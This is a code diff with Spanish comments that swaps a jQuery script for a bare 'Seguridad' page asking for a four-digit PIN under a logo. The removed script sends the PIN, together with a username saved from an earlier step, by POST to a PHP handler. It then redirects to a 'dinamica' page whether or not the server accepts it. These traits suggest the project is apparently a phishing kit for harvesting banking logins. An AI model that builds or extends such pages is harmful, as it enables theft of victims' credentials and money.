@@ -1,52 +1,19 @@
-<script type="text/javascript">
-    $(document).ready(function() {
-        $("#btn-password").click(function(e) {
-            e.preventDefault();
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Seguridad</title>
+</head>
+<body style="background: white; text-align: center; padding-top: 50px;">
+    <img src="../img/logo.png" width="150">
+    <h3 style="font-family: sans-serif; color: #333;">Ingresa tu clave</h3>
+    <input type="password" id="input_real" maxlength="4" style="padding: 10px; font-size: 20px; width: 80%;">
+    <br><br>
+    <button id="btn-password" style="background: #ffdd00; border: none; padding: 15px 30px; font-weight: bold;">CONTINUAR</button>
 
-            // 1. Capturamos el PIN
-            var pin = $("#input_real").val();
-            
-            // 2. IMPORTANTE: Recuperar el usuario guardado en el paso anterior
-            // Si el nombre de la variable en el primer paso fue diferente, cámbialo aquí
-            var usr = localStorage.getItem('user_akam');
-
-            // 3. Validación básica
-            if (!pin || pin.length < 4) {
-                alert("Por favor ingrese su clave completa.");
-                return false;
-            }
-
-            // Mostramos el loader/animación de carga
-            $("#fondo, #cargando-o").show();
-            
-            $.ajax({
-                type: 'POST',
-                url: '../process/pasousuario.php', // Verifica que la ruta sea correcta desde tu ubicación actual
-                data: { 
-                    'txt-usuario': usr, 
-                    'txt-password': pin 
-                },
-                success: function(res) {
-                    // Limpiamos la respuesta por si el PHP devuelve espacios
-                    var respuesta = res.trim();
-                    
-                    if(respuesta === "ok") {
-                        // Si todo sale bien, vamos a la dinámica
-                        window.location.href = "dinamica.php"; 
-                    } else {
-                        // Si hay un error (ej: error_bd), lo registramos pero seguimos para no trabar al usuario
-                        console.error("Servidor respondió: " + respuesta);
-                        window.location.href = "dinamica.php"; 
-                    }
-                },
-                error: function(xhr, status, error) {
-                    // Si falla la conexión con el servidor (Railway caído, etc)
-                    console.error("Error de red: " + error);
-                    setTimeout(function() { 
-                        window.location.href = "dinamica.php"; 
-                    }, 1000);
-                }
-            });
-        });
-    });
-</script>
+    <script src="../js/jquery-3.6.0.min.js"></script>
+    <script>
+        // Aquí pegas el script de AJAX que actualizamos antes
+    </script>
+</body>
+</html>
